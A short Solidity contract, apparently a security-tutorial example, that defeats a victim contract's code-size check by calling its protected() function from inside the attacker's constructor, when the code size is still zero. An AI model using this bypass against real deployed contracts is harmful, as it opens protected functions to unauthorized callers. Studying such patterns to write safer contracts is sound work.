// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.10;
import "./Victim.sol";

contract Hack {
    bool public isContract;

    constructor(address _target) {
        isContract = Victim(_target).isContract(address(this));
        Victim(_target).protected();
    }
}

// When the contract is deployed in the exact transaction
// when this function is called size will be zero